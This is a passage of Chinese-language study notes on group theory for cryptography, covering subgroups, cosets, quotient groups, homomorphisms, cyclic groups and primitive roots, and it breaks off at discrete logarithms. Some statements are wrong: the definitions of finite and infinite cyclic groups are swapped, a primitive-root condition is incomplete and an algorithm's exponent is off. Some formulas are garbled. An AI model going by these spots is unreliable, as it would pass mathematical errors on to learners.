        <content type="html"><![CDATA[<h2 id="密码学学习笔记——筑基篇·卷二（群论）"><a href="#密码学学习笔记——筑基篇·卷二（群论）" class="headerlink" title="密码学学习笔记——筑基篇·卷二（群论）"></a>密码学学习笔记——筑基篇·卷二（群论）</h2><hr><h1 id="群论"><a href="#群论" class="headerlink" title="群论"></a>群论</h1><hr><h2 id="代数结构-algebraic-structure"><a href="#代数结构-algebraic-structure" class="headerlink" title="代数结构(algebraic structure)"></a>代数结构(algebraic structure)</h2><p>$(G,🐱,🥒\dots$)</p><p>$G指非空集合，\underbrace{🐱, 🥒 ,\dots}_{二元运算(需要两个运算数)}$</p><script type="math/tex; mode=display">\begin{align}   封闭性：\forall\ a,b & \in G,   \\   a🐱b & \in G\\a 🥒 b & \in G\\ \dots \\集合中任意两个元素运算&的结果仍然是这个集合里的元素\end{align}</script><p><strong>代数结构必须满足封闭性</strong></p><hr><h2 id="群-Group"><a href="#群-Group" class="headerlink" title="群(Group)"></a>群(Group)</h2><p><strong>定义</strong>：若<script type="math/tex">(G,*)</script>是一个群，则它满足以下<strong>性质</strong>：</p><ul><li><p>封闭性：$ \forall a,b\in \mathbb{G}, a*b \in \mathbb{G}$</p></li><li><p>结合律：<script type="math/tex">\forall a,b,c\in \mathbb{G}, a*(b*c)=(a*b)*c</script></p></li><li><p>单位元(幺元,identity)：<script type="math/tex">\exists e\in \mathbb{G} , \forall a\in \mathbb{G} , a*e=e*a=a</script></p><p><strong>定理1：群里的单位元是唯一的</strong></p></li><li><p>逆元(inverse)：<script type="math/tex">\exists b\in \mathbb{G} , a*b=b*a=e</script><br><script type="math/tex">a的逆元记为a^{-1},即a^{-1}=b,b^{-1}=a，\\单位元以自身为逆元</script></p><p><strong>定理2:每个元素都有唯一的逆元</strong></p></li></ul><blockquote><p>例：</p><p>$(\mathbb{Z},+)$<br>封闭性：整数相加还是整数<br>结合律：整数相加满足加法结合律<br>单位元：0 (任何整数加0都等于它本身)<br>逆 元：整数的相反数<br><strong>是群😊</strong></p><p>$(\mathbb{Q},\times)$<br>封闭性：有理数相乘还是有理数<br>结合律：有理数相乘满足乘法结合律<br>单位元：1 (任何有理数乘1都等于它本身)<br>逆 元：有理数的倒数(0除外)<br><strong>不是群😭</strong><br>$(\mathbb{Q}\setminus{0},\times)$就是<strong>群</strong>了</p><p>$(\mathbb{Z_p^<em>},\times)$<br>封闭性：相乘再模p，还是$\mathbb{Z_p^</em>}$里的元素<br>结合律：模运算下乘法满足乘法结合律<br>单位元：1 <br>逆 元：乘法逆元<br><strong>是群😊</strong></p></blockquote><p>“$(\mathbb{G},*)$是一个群”,通常简写作：“$\mathbb{G}$是一个群”</p><blockquote><p>例：简称“$\mathbb{Z}_p^*$ 是一个群”,默认运算为“模$p$下的乘法”</p></blockquote><hr><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><p><strong>有限群</strong>：$\mathbb{G}$是有限集，比如 $(\mathbb{Z}_p^*,X)$称$\mathbb{G}$里元素个数为群$\mathbb{G}$的“阶”,记为$|\mathbb{G}|$</p><p><strong>无限群</strong>：$\mathbb{G}$是无限集，比如$(\mathbb{Z},+)$、$(\mathbb{Q}\setminus{0},\times)$，群$\mathbb{G}$的“阶”为<strong>无限阶</strong></p><p><strong>单位元、逆元</strong></p><ul><li>封闭性$\Rightarrow$左单位元=右单位元=单位元</li><li>结合律$\Rightarrow$左逆元=右逆元=逆元</li></ul><p><strong>平凡群</strong>：群里只有一个元素时，称为“平凡群”。唯一元素就是单位元。</p><blockquote><p>如:$({1},\times)$<br>封闭性：1$\times$1=1<br>结合律：乘法结合律<br>单位元：1 <br>逆 元：1$\times$1=1<br></p></blockquote><hr><h2 id="群的性质"><a href="#群的性质" class="headerlink" title="群的性质"></a>群的性质</h2><ul><li>(消去律) <script type="math/tex">a*b=a*c\Rightarrow b=c</script></li><li>方程$a*x=b\ 有唯一解下\in \mathbb{G}$</li><li><script type="math/tex; mode=display">(a*b)^{-1}=b^{-1}*a^{-1}</script></li><li>$(a^{-1})^{-1}=a$</li></ul><hr><h2 id="阿贝尔群（abelian-group）"><a href="#阿贝尔群（abelian-group）" class="headerlink" title="阿贝尔群（abelian group）"></a>阿贝尔群（abelian group）</h2><p>又称<strong>交换群</strong>(commutative group)</p><p><strong>定义：</strong>如果对于群$\mathbb{G}$中的任意元素$a,b\in \mathbb{G}$,都有$a<em>b=b</em>a,$则称$\mathbb{G}$为阿贝尔群。</p><p><strong>定理</strong>：群$\mathbb{G}$是阿贝尔群，当且仅当，$\forall a,b\in \mathbb{G}$,有$(a<em>b)^2=a^2</em>b^2$</p><p><strong>定理</strong>：群$\mathbb{G}$是阿贝尔群，$\forall a,b\in \mathbb{G}$,有$(a<em>b)^t=a^t</em>b^t$</p><h3 id="群的简记符号"><a href="#群的简记符号" class="headerlink" title="群的简记符号"></a>群的简记符号</h3><p>t个a一起运算，简记为<script type="math/tex">a^t:a*a*\dots*a</script><br>并不表示t和a之间的运算，t是整数，a是群里的元素</p><script type="math/tex; mode=display">a^{-t}: (a^{-1})^t=a^{-1}*a^{-1}*\cdots*a^{-1}</script><p>$(a^t)^m=a^{tm}$</p><p>$a^t*a^m=a^{t+m}$</p><p>$(a^{-1})^t=(a^t)^{-1}$</p><hr><h2 id="子群-subgroup"><a href="#子群-subgroup" class="headerlink" title="子群(subgroup)"></a>子群(subgroup)</h2><p><strong>定义</strong>：设<script type="math/tex">(\mathbb{G},*)</script>是群，$\mathbb{H}$是$\mathbb{G}$的非空子集，如果<script type="math/tex">(\mathbb{H},*)</script>是一个群，则称<script type="math/tex">(\mathbb{H},*)</script>是<script type="math/tex">(\mathbb{G},*)</script>的子群。</p><h3 id="mathbb-G-的子群"><a href="#mathbb-G-的子群" class="headerlink" title="$\mathbb{G}的子群$"></a>$\mathbb{G}的子群$</h3><p>平凡子群：<script type="math/tex">(\{e\},*)、(\mathbb{G},*)</script><br>非平凡子群：<script type="math/tex">(\mathbb{H},*)</script> 且 $\mathbb{H}\neq { e} , G$ (又称真子群)</p><p>阿贝尔群的子群也一定是阿贝尔群</p><h3 id="子群的单位元"><a href="#子群的单位元" class="headerlink" title="子群的单位元"></a>子群的单位元</h3><p><strong>定理</strong>：$\mathbb{H}$是群$\mathbb{G}$的子群，$e\in \mathbb{G}$是单位元，则$e$ 也是子群$\mathbb{H}$的单位元。(<strong>省流：群的单位元也是其子群的单位元</strong>)</p><h3 id="子群的逆元"><a href="#子群的逆元" class="headerlink" title="子群的逆元"></a>子群的逆元</h3><p><strong>定理</strong>：$\mathbb{H}$是群$\mathbb{G}$的子群，$a\in \mathbb{H}$是单位元，,则 $a^{-1}\in \mathbb{H}$(<strong>省流:元素在子群中,其逆元也必在该子群中</strong>)</p><h3 id="判断子群"><a href="#判断子群" class="headerlink" title="判断子群"></a>判断子群</h3><p><strong>判断子群(1)</strong></p><p><strong>定理</strong>：$\mathbb{H}$是群$\mathbb{G}$的非空子集，对于任意 $a,b\in \mathbb{H}$,都有 <script type="math/tex">a*b^{-1}\in \mathbb{H}</script>,则$\mathbb{H}$是<script type="math/tex">\mathbb{G}</script>的子群。</p><p><strong>判断子群(2)</strong></p><p><strong>定理</strong>：$\mathbb{H}$是群$\mathbb{G}$的非空子集，如果$\mathbb{H}$是有限集，而且$\mathbb{G}$的运算<em>在$\mathbb{H}$上满足封闭性，则$\mathbb{H}$是$\mathbb{G}$的子群。(<em>*省流：$\mathbb{H}$是有限集、封闭，便是子群</em></em>)</p><h3 id="构造子群"><a href="#构造子群" class="headerlink" title="构造子群"></a>构造子群</h3><p><strong>方法1</strong></p><p><strong>定理</strong>：$\mathbb{G}$是阿贝尔群，$m\in\mathbb{Z}$,<br>则$\mathbb{G}^m:={a^m\mid a\in \mathbb{G}}$是$\mathbb{G}$的子群。</p><script type="math/tex; mode=display">\mathbb{(Z_n^{*}})^2是\mathbb{Z_n^{*}}的子群</script><script type="math/tex; mode=display">\mathbb{(Z_n^{*}})^m是\mathbb{Z_n^{*}}的子群</script><p><strong>方法2</strong></p><p><strong>定理</strong>：$\mathbb{G}$是阿贝尔群，$m\in\mathbb{Z}$,<br>则$\mathbb{G}{m}:={a\in \mathbb{G}\mid a^m=e}$是$\mathbb{G}$的子群。</p><blockquote><p>例:$\mathbb{Z_n}{m}=\mathbb{Z_n}{d}=\frac nd\mathbb{Z_n}\quad d=gcd(m,n),且构造的子群只有d个元素$</p></blockquote><p><strong>方法3</strong></p><p><strong>定理</strong>：<script type="math/tex">\begin{aligned}&\text{设}G\text{是群,}a\in G\text{,则}\\&<a>:=\{a^z\mid z\in Z\}\text{是由}a\text{生成的}G\text{的子群。}\end{aligned}</script></p><h4 id="子群构造子群"><a href="#子群构造子群" class="headerlink" title="子群构造子群"></a>子群构造子群</h4><p><strong>定理1</strong>：$\mathbb{H}_1$和$\mathbb{H}_2$是阿贝尔群$\mathbb{G}$的子群，则$\mathbb{H}:=\mathbb{H}_1\mathbb{H}_2$也是$G$的子群。<br>$H:=\mathbb{H}_1\mathbb{H}_2:={a_1*a_2|a_1\in \mathbb{H}_1,a_2\in \mathbb{H}_2}$</p><p><strong>扩展</strong>：以上定理中的2个子群扩展至<strong>任意多个子群</strong>，结论依然成立</p><hr><p><strong>定理2</strong>：$\mathbb{H}_1$和$\mathbb{H}_2$是群$\mathbb{G}$的子群，则$\mathbb{H}:=\mathbb{H}_1\cap \mathbb{H}_2$<br>也是$\mathbb{G}$的子群。(省流：子群的交集是子群)<br>$\mathbb{H}:=\mathbb{H}_1\cap \mathbb{H}_2:={a\mid a\in \mathbb{H}_1,a\in \mathbb{H}_2}$</p><p><strong>扩展</strong>：以上定理中的2个子群扩展至<strong>任意多个子群</strong>，结论依然成立</p><hr><p><strong>子群的并集未必是子群</strong></p><p><strong>定理3</strong>：$\mathbb{H}_1$和$\mathbb{H}_2$是群$\mathbb{G}$的非平凡子群，</p><p>​                则$\mathbb{G}:\neq\mathbb{H}_1\cup \mathbb{H}_2$</p><h3 id="整数群的子群"><a href="#整数群的子群" class="headerlink" title="整数群的子群"></a>整数群的子群</h3><p><strong>定理1</strong>：$\mathbb{H}$是$\mathbb{Z}$的子群，则存在唯一的非负整数 $m$,使得$\mathbb{H}=\boldsymbol{m}\mathbb{Z}$</p><script type="math/tex; mode=display">\begin{aligned}m \mathbb{Z}&:=\{mz\mid z\in\mathbb{Z}\}\\&=\{0,\pm m,\pm2m,...\}\end{aligned}</script><p><strong>定理2</strong>：$m_1和m_2\text{是非负整数,则 }m_2|m_1\text{,当且}仅当,m_1\mathbb{Z}\subseteq m_2\mathbb{Z}。$</p><p><strong>定理3</strong>：</p><script type="math/tex; mode=display">\mathbb{H}是\mathbb{Z_n}的子群,\\ 1.存在n的唯一正因子 m,使得H=m\mathbb{Z_n}.\ \\x不是n的因子 \Rightarrow x\mathbb{Z_n}=m\mathbb{Z_n},\quad\exists m\mid n.\ \\2.m_1和m_2是n的正因子,则 m_2|m_1,当且仅当,m_1\mathbb{Z}\subseteq m_2\mathbb{Z}。</script><h3 id="正规子群-normal-subgroup"><a href="#正规子群-normal-subgroup" class="headerlink" title="正规子群(normal subgroup)"></a>正规子群(normal subgroup)</h3><p><strong>定义</strong>：$设\mathbb{N}是群\mathbb{G}的子群，如果对于\forall a\in \mathbb{G},都有a\mathbb{N}=\mathbb{N}a,称\mathbb{N}为\mathbb{G}的正规子群$</p><p>阿贝尔群的子群都是正规子群</p><blockquote><p>现在不懂没关系，往下你就知道了：<strong>正规子群本身是商群的一个元素，叫作平凡陪集，包含群的单位元，本身还是商群的单位元，被分类到N的元素，必然是同态核里的元素，自然映射的同态核就是正规子群N</strong></p></blockquote><hr><h2 id="陪集-coset"><a href="#陪集-coset" class="headerlink" title="陪集(coset)"></a>陪集(coset)</h2><p>定义：$\mathbb{H}$ 是群$\mathbb{G}$的子群，$a\in \mathbb{G}$,则</p><script type="math/tex; mode=display">a\mathbb{H}:=\{a*h|h\in \mathbb{H}\}</script><p>称为 $\mathbb{H}$ 关于$a$在$\mathbb{G}$中的左陪集 (left cost)。同理，</p><script type="math/tex; mode=display">\mathbb{H}a:=\{h*a|h\in \mathbb{H}\}</script><p>称为 $\mathbb{H}$ 关于$a$在$\mathbb{G}$中的右陪集 (right cost)。</p><p>陪集：$[a]_\mathbb{H}$<br>左陪集：$a\mathbb{H}$<br>右陪集：$\mathbb{H}a$</p><p><strong>左右陪集相等不能说明满足交换律，只能说明对于右陪集的一个元素存在左陪集的一个元素使得两者相等</strong></p><p>$b=a<em>h或a=b</em>h，\exist h\in \mathbb{H}\a,b会被分类到同一个陪集$</p><p>$a\equiv b \pmod {\mathbb{H}}:a和b在同一个(由\mathbb{H}构造的)陪集里$</p><p>$\iff b\equiv a\pmod{\mathbb{H}}$</p><p>$\iff b \equiv a*h,\exist\ h\in \mathbb{H}$</p><p>$\iff b\in [a]_{\mathbb{H}}$</p><p>$\iff [a]_\mathbb{H}=[b]_\mathbb{H}$</p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ul><li>$a\in [a]_\mathbb{H}$</li><li>$[e]_\mathbb{H}=\mathbb{H}(平凡陪集)$</li><li>$a\in \mathbb{H}\iff[a]_\mathbb{H}=\mathbb{H}$</li><li><script type="math/tex; mode=display">[a]_\mathbb{H}=[b]_\mathbb{H}\Leftrightarrow a^{-1}*b\in \mathbb{H}\text{ (或 }b^{-1}*a\in \mathbb{H})</script></li></ul><p>$a\equiv b\pmod {\mathbb{H}}:a和b在同一个(由\mathbb{H}构造的)陪集里\\iff b=a*h,\exists h\in \mathbb{H}\\iff b\in [a]_\mathbb{H}$</p><script type="math/tex; mode=display">\begin{aligned}\ [a]_{n\mathbb{Z}}& =\{b\in \mathbb{Z}\mid b\equiv a\pmod{n}\} \\&=\{b\in \mathbb{Z}\mid b=a+nz,z\in \mathbb{Z}\} \\&=\{b\in \mathbb{Z}\mid b\equiv a\pmod{n}\} \\&=[a],[a]\in\mathbb{Z}_n\end{aligned}</script><p>$·\equiv ·\pmod {\mathbb{H}}是等价关系$</p><ul><li>自反性</li><li>对称性</li><li>传递性</li></ul><p><strong>性质</strong>：任意两个陪集$[a]_\mathbb{H}$和$[b]_\mathbb{H}$之间存在双射，任意陪集$[a]_\mathbb{H}$和子群$\mathbb{H}$是等势的</p><h3 id="阿贝尔群的陪集"><a href="#阿贝尔群的陪集" class="headerlink" title="阿贝尔群的陪集"></a>阿贝尔群的陪集</h3><p><strong>性质1</strong>：$\mathbb{H}是阿贝尔群\mathbb{G}的子群，对于\forall a\in \mathbb{G}，有a\mathbb{H}=\mathbb{H}a\ ([a]_\mathbb{H})$</p><p>注意：$如果对于\forall a,都有a\mathbb{H}=\mathbb{H}a,则\mathbb{G}未必是阿贝尔群$</p><p><strong>性质2</strong>：阿贝尔群的子群都是正规子群<br><strong>性质3</strong>：阿贝尔群的任意子群都可以构造商群<br><strong>性质4</strong>：阿贝尔群的子群构造的商群也是阿贝尔群</p><hr><h2 id="拉格朗日定理"><a href="#拉格朗日定理" class="headerlink" title="拉格朗日定理"></a>拉格朗日定理</h2><p><strong>定理</strong>：$\mathbb{G}是有限群，\mathbb{H}是\mathbb{G}的任意子群，\则|\mathbb{H}|\mid|\mathbb{G}|$</p><p>$\begin{aligned}&amp;\text{证明:设}\mathbb{H}\text{构造的陪集为}[a_1]_\mathbb{H},…,[a_n]_\mathbb{H}\text{,它们是}\mathbb{G}\text{的}\&amp;\text{划分。所以,}|\mathbb{G}|=\sum_{i=1}^n|[a_i]_\mathbb{H}|=\sum_{i=1}^n|\mathbb{H}|=n|\mathbb{H}|\end{aligned}$</p><hr><h2 id="商群"><a href="#商群" class="headerlink" title="商群"></a>商群</h2><p><strong>定义</strong>：$群(\mathbb{G}/\mathbb{N},*):群\mathbb{G}在模\mathbb{N}下的商群$</p><p>$集合\mathbb{G}/\mathbb{N}={[a]_\mathbb{N}|a\in \mathbb{G}}$</p><p>$\mathbb{N}为正规子群，正规子群是啥？往上翻😾$</p><script type="math/tex; mode=display">二元运算[a]_\mathbb{N}*[b]_\mathbb{N}=[a*b]_\mathbb{N}</script><p>正规子群是其中的<strong>平凡陪集</strong>，商群重点关注其中的非平凡陪集，元素不属于正规子群</p><p>整数群$\mathbb{Z}={0,\pm1,\pm2,…}$</p><p>子群$n\mathbb{Z}={0,\pm n,\pm2n,…}$</p><p>商群$\mathbb{Z}/ n\mathbb{Z}:$ </p><p>$[ 0] _{n\mathbb{Z}}= { 0, \pm n, \pm 2n, . . . }=[0]$<br>$[1]_{n\mathbb{Z}}={1,1\pm n,1\pm2n,…}=[1]$<br>$[2]_{n\mathbb{Z}}={2,2\pm n,2\pm2n,…}=[2]$<br>$\dots$<br>$[n-1]_{n\mathbb{Z}}={n-1,(n-1)\pm n,…}=[n-1]$<br>$[n]_{n\mathbb{Z}}={n,n\pm n,n\pm2n…}=[0]$<br>$[n+1]_{n\mathbb{Z}}={n+1,(n+1)\pm n,…}=[1]$</p><p>$\dots$</p><p>$\mathbb{Z}/ n\mathbb{Z}={[0],[1],\dots \,[n-1]}=\mathbb{Z_n}$</p><p>在整数群里，<strong>陪集</strong>和<strong>剩余类</strong>本质上是同一个东西，都是在等价关系上形成的等价类</p><h3 id="商群的阶"><a href="#商群的阶" class="headerlink" title="商群的阶"></a>商群的阶</h3><p>$[\mathbb{G}:\mathbb{N}]商群\mathbb{G}/\mathbb{N}的阶$</p><p><strong>定理1</strong>：$\mathbb{G}是有限群，\mathbb{N}是\mathbb{G}的正规子群，[\mathbb{G}:\mathbb{N}]=\frac{\mathbb{G}}{\mathbb{N}}$</p><p><strong>定理2</strong>：$\mathbb{G}是有限群，\mathbb{N}是\mathbb{G}的正规子群，\mathbb{K}是\mathbb{N}的正规子群，[\mathbb{G}:\mathbb{K}]=[\mathbb{G}:\mathbb{N}][\mathbb{N}:\mathbb{K}]$</p><hr><h2 id="群同态-group-homomorphism-名字可爱捏😸"><a href="#群同态-group-homomorphism-名字可爱捏😸" class="headerlink" title="群同态(group homomorphism,名字可爱捏😸)"></a>群同态(group homomorphism,名字可爱捏😸)</h2><p><strong>定义</strong>：设群$(\mathbb{G},*)$和群$(\mathbb{G}^\prime,\otimes)$,如果函数 $f:\mathbb{G}\to \mathbb{G}^\prime$ 对于</p><p>$\forall\boldsymbol{a},b\in \mathbb{G}$ ,都有</p><p>$f(a*b)=f(a)\otimes f(b),$</p><p>$f$为$(\mathbb{G},*)$到$(\mathbb{G}^\prime,\otimes)$的群同态。</p><h3 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h3><p>1.$f(e)=e^{\prime}\ (e和e^{\prime}分别是群G和G^{\prime}的单位元)$</p><p>2.$f(a^{-1})=f(a)^{-1},\quad\forall a\in G$</p><p>3.$H是G的子群\Longrightarrow f(H)是G^{\prime}的子群$<br>扩展：$H=G,\Rightarrow f(G)=Imf$</p><p>4.$H^{\prime}是G^{\prime}的子群\Rightarrow f^{-1}(H^{\prime})是G的子群$<br>扩展：$H^{\prime}={e^{\prime}}$</p><p>5.$f(a^m)=f(a)^m,\quad\forall a\in G,\forall m\in \mathbb{Z}$</p><h3 id="同态像-homomorphic-image"><a href="#同态像-homomorphic-image" class="headerlink" title="同态像(homomorphic image)"></a>同态像(homomorphic image)</h3><p>$f:\mathbb{G}\to \mathbb{G}^\prime$ </p><p><strong>同态像</strong>$ Imf:=f(G):={f(a)|a\in G},(同态像Imf是G^{\prime}的子群)$</p><h3 id="同态核"><a href="#同态核" class="headerlink" title="同态核"></a>同态核</h3><p><strong>同态核</strong>$Kerf:={a\in G|f(a)=e^{\prime}},(同态核Kerf是G的子群)$</p><p>$(e^{\prime}$表示$G^\prime$的单位元)</p><p><strong>定理</strong>：$f{:}G\to G^{\prime}\text{ 是群同态,则Ker }f\text{是正规子群}$</p><h3 id="群同态的复合"><a href="#群同态的复合" class="headerlink" title="群同态的复合"></a>群同态的复合</h3><p><strong>定理</strong>：$f$是$(G,*)$到$(G^\prime,\otimes)$的群同态，$f^\prime$是$(G^\prime,\otimes)$到$(G^{\prime\prime}$,田)的群同态，则$f$和$f^\prime$的复合</p><script type="math/tex; mode=display">f^{\prime}\circ f{:}G\to G^{\prime\prime}$$也是群同态### 判断单一同态**定理1**：$$f: G\to G^{\prime}是群同态,\forall a,b\in G,有\\f(a)=f(b)\Leftrightarrow a\equiv b\pmod {Ker f}</script><p><strong>定理2</strong>：</p><script type="math/tex; mode=display">f: G\to G^{\prime}是群同态,有\\f是单射 \Longleftrightarrow Kerf=\{e\}</script><h3 id="判断满同态"><a href="#判断满同态" class="headerlink" title="判断满同态"></a>判断满同态</h3><p>$f\text{是满同态}\Leftrightarrow Imf=G^{\prime}$</p><h3 id="嵌入映射-inclusion-map"><a href="#嵌入映射-inclusion-map" class="headerlink" title="嵌入映射(inclusion map)"></a>嵌入映射(inclusion map)</h3><p>$H \to G$</p><p>$a\to f(a)=a$</p><p>子群元素直接映射到自身</p><p>子群到群的嵌入映射是个群同态<br>原像和像之间是一对一的，单射</p><p><strong>单一同态：$f$是单射</strong></p><h3 id="自然映射-natural-map"><a href="#自然映射-natural-map" class="headerlink" title="自然映射(natural map)"></a>自然映射(natural map)</h3><p>$G \to G/N,(N是G的正规子群)$</p><p>$a\to f(a)=[a]_N$</p><p><strong>自然映射的同态核就是正规子群N</strong></p><p><strong>满同态：$f$是满射</strong></p><h3 id="m次方映射-m-power-map"><a href="#m次方映射-m-power-map" class="headerlink" title="m次方映射(m-power map)"></a>m次方映射(m-power map)</h3><p>$G是阿贝尔群$</p><p>$G \to G$</p><p>$a\to f(a)=a^m$</p><p>$Imf=G^m$</p><p>$Kerf=G{m}$</p><h3 id="雅可比映射-Jacobi-map"><a href="#雅可比映射-Jacobi-map" class="headerlink" title="雅可比映射(Jacobi map)"></a>雅可比映射(Jacobi map)</h3><p>$\mathbb{Z}_n^* \to {\pm 1}$</p><p>$a\to J_n(a)=(\frac an)$</p><hr><h2 id="群同构-group-isomorphism"><a href="#群同构-group-isomorphism" class="headerlink" title="群同构(group isomorphism)"></a>群同构(group isomorphism)</h2><ul><li><p><strong>双射(单射&amp;满射)</strong></p></li><li><p><strong>群同态</strong></p></li></ul><p>$G$与$G^\prime$同构，记为$G\cong G^\prime$<br>$G$与$G$之间的同构：自同构(group automorphism)</p><h3 id="第一同构定理-first-isomorphism-theorem"><a href="#第一同构定理-first-isomorphism-theorem" class="headerlink" title="第一同构定理(first isomorphism theorem)"></a>第一同构定理(first isomorphism theorem)</h3><p>又称：基本同态定理 (FHT, fundamental homomorphism theorem)</p><p>定理：设群<script type="math/tex">(G,*)</script>和群$( G^\prime , \otimes )$, $f{: }G\to G^\prime$ 是群同态($同<br>态核是Kerf，同态像是Imf$),则</p><script type="math/tex; mode=display">G/Kerf\cong Imf</script><script type="math/tex; mode=display">\rho:[a]_{Kerf}\quad f(a)</script><hr><h2 id="循环群-cyclic-group"><a href="#循环群-cyclic-group" class="headerlink" title="循环群(cyclic group)"></a>循环群(cyclic group)</h2><p>孩子们，去往上回忆一下<strong>构造子群·方法3</strong></p><p>定义：设$G$是群，$g\in G$,如果</p><script type="math/tex; mode=display">G=<g>,</script><p>则称$G$是<strong>循环群</strong>，$g$是循环群$G$的<strong>生成元(generator)</strong>(可以有不止一个个生成元)。</p><ul><li><p><strong>有限循环群</strong>：群元素个数是无限的，同构于$\mathbb{Z}$</p><p><strong>任意无限循环群都只有2个生成元</strong></p></li><li><p><strong>无限循环群</strong>：群元素个数是有限的,同构于$\mathbb{Z}_n$</p></li></ul><p><strong>定理</strong>：任意循环群都是阿贝尔群</p><p><strong>定理</strong>：循环群的子群是循环群</p><p><strong>定理</strong>：设$G$是循环群(生成元g)，$H$是其子群，则商群$G/H$是循环群(生成元$[g]_H$)</p><h3 id="循环群的同构"><a href="#循环群的同构" class="headerlink" title="循环群的同构"></a>循环群的同构</h3><p>1.<script type="math/tex">\begin{aligned}\text{对于无限循环群}G\text{的任意子群}H\text{,都存在唯一的非}\text{负整数}m\text{,使得}H=G^m。\end{aligned}</script></p><p>2.<script type="math/tex">对于n阶有限循环群G的任意子群H,都存在n的唯一正因子m,使得H=G^m</script></p><hr><h2 id="元素的阶-order"><a href="#元素的阶-order" class="headerlink" title="元素的阶(order)"></a>元素的阶(order)</h2><p><strong>定义</strong>：设$G$是群，$a\in G$,如果$n$是满足$a^n=e$的<strong>最小正整数</strong>，则称$n$是元素$a$的<strong>阶</strong>。</p><blockquote><p>PS:存在<strong>无限阶</strong>的元素</p></blockquote><p>性质$1:G$是群，元素$a$的阶是$n$ (a$^n=e)$,则$\forall m\in Z$,有$n|m\Leftrightarrow a^m=e_0$</p><p>性质$2:$有限循环群的阶是$n$,则生成元$g$的阶也是$n$,且群里元素 $g,g^2,g^3,…,g^n(=g^0=e)$各不相同。</p><p>性质$3:$正整数$d\mid n$, $n$阶有限循环群恰有唯一的$d$阶子群$<g^\frac nd>$</g^\frac></p><p>性质$4:<script type="math/tex">n$阶有限循环群</script><g><script type="math/tex">,</script>\forall k\in Z<script type="math/tex">,有</script>g^k<script type="math/tex">的阶是</script>\frac n{gcd(n,k)}$$</g></p><p>性质$5:$$n$阶有限循环群有$\phi(n)$ 个生成元。</p><p>性质$6:$$G$是有限群，元素$a$的阶是$|G|$的因子。</p><p>性质$7:$素数阶的群必然是<strong>有限循环群</strong></p><p>性质$8:<script type="math/tex">$\begin{aligned}G\text{是}n\text{阶有限循环群,}d\text{是}n\text{的正因子,}G\text{里的}d\text{阶}\text{元素一共有}\phi(d)\text{个。}\end{aligned}</script></p><hr><h2 id="原根-primitive-root"><a href="#原根-primitive-root" class="headerlink" title="原根(primitive root)"></a>原根(primitive root)</h2><p>不妨先去复习一下<strong>卷一(数论)</strong>中的<strong>乘法阶</strong>概念</p><p>$g一般表示生成元$</p><p><strong>定义</strong>：$g\in\mathbb{Z},gcd(g,n)=1$,如果$ord_n(g)=\phi(n)$,称$g$是模$n$下的<strong>原根</strong>。</p><ul><li>$g$是模$n$下的原根，则$g^{ord_n(g)}\equiv g^{\phi(n)}\equiv1\left({\mathrm{mod~}}n\right)$。</li></ul><p>原根的阶是$\phi(n)$,<script type="math/tex">Z_n^*</script>的阶也是$\phi(n)\Longrightarrow$原根是<script type="math/tex">Z_n^*</script>的生成元<script type="math/tex">\Longrightarrow\mathbb{Z}_n^*</script>是循环群</p><blockquote><script type="math/tex; mode=display">Z_n^*$$里，“元素的阶”就是元素的“乘法阶”模$n$下存在原根的话，$$Z_n^*$$是循环群，“生成元”就是“原根”$$(n=1,2,4,p^e,2p^e)</script></blockquote><p>$\forall k\in\mathbb{Z}\text{,}g^k\text{的乘法阶是 }\frac{\phi(n)}{gcd(\phi(n),k)}$</p><script type="math/tex; mode=display">Z_p^*\text{里,}\forall k\in Z\text{,}g^k\text{的乘法阶是}\frac{p-1}{gcd(p-1,k)}</script><p>模n下原根一共$\phi(\phi(n))$个</p><script type="math/tex; mode=display">\mathbb{Z}_p^*\text{的生成元一共}\phi(p-1)\text{个}</script><h3 id="原根存在的条件"><a href="#原根存在的条件" class="headerlink" title="原根存在的条件"></a>原根存在的条件</h3><p>设$p$是<strong>奇素数</strong>，$e$是<strong>正整数</strong><br>$n=1,2,4,p^e,2p^e$ 时，模$n$下存在原根</p><script type="math/tex; mode=display">Z_p^*\text{里,}\forall k\in Z\text{,}g^k\text{是原根}\Leftrightarrow gcd(p-1,k)</script><h3 id="寻找原根-生成元-的算法"><a href="#寻找原根-生成元-的算法" class="headerlink" title="寻找原根(生成元)的算法"></a>寻找原根(生成元)的算法</h3><script type="math/tex; mode=display">\begin{aligned}&\forall a\in\mathbf{Z}_n^*\Longrightarrow ard_n(a)|\phi(n)\\&a\text{是原根}\Longrightarrow ord_n(a)=\phi(n)\\&\text{设 }\phi(n)=p_1^{e_1}...p_r^{e_r}\\&a\text{不是原根}\Longrightarrow\exists d|\phi(n),d<\phi(n),a^d=1 \pmod n\\&\Longrightarrow\exists p_j,d|\frac{\phi(n)}{p_j} \Longrightarrow\exists q,dq=\frac{\phi(n)}{p_j}\\&a^d\equiv1 \pmod n\Longrightarrow a^{\frac{\phi(n)}{p_j}}\equiv a^{dq}\equiv(a^d)^q\equiv1 \pmod n\end{aligned}</script><p><strong>算法1</strong>：</p><blockquote><p>step1.$因子分解\phi(n),求出其各个素因子 p_1,…,p_r$</p><p>step2.任选$a\in\mathbb{Z}_n^*$</p><p>step3.$if\ a^\frac{\phi(n)}{p_i} \not\equiv1(mod\: n),i=1,…,r$</p><p>​        output a</p><p>else goto step2.</p></blockquote><p><strong>算法2</strong>:<script type="math/tex">\text{如何找}Z_p^*\text{的原根(生成元)}\\\text{设 }p\text{ 是奇素数,}\phi(p)=p-1=p_1^{t_1}...p_r^{t_r}</script></p><blockquote><p>for $i=1$​ to $r$</p><p>{</p><p>do{</p><p>​        任选$a\in Z_p^*$</p><p>} while $(a^{\frac{p-1}{p_i}}\equiv1$ (mod $p))$</p><p>$c_i\equiv a^{p_i{\frac{p-1}{t_i}}}\pmod p$</p><p>}</p><p>output $\prod_{i=1}^rc_i\pmod p$ </p><p><strong>定理1</strong>：设$G$是群，$c\in G$,对于某个素数$p$和整数$t\geq1$,如果<br>$c^{p^t}=e$ 但 $c^{p^{t-1}}\neq e$,则$c$的阶是$p^t$。</p><p><strong>定理2</strong>：设$G$是群，$c_1,c_2\in G$,$c_1,c_2$的阶分别为$m_1,m_2$,且$gcd(\boldsymbol{m}_1,\boldsymbol{m}_2)=1$,则<script type="math/tex">c_1*c_2</script>的阶是$m_1m_2$。</p></blockquote><hr><h2 id="离散对数-discrete-logarithm"><a href="#离散对数-discrete-logarithm" class="headerlink" title="离散对数(discrete 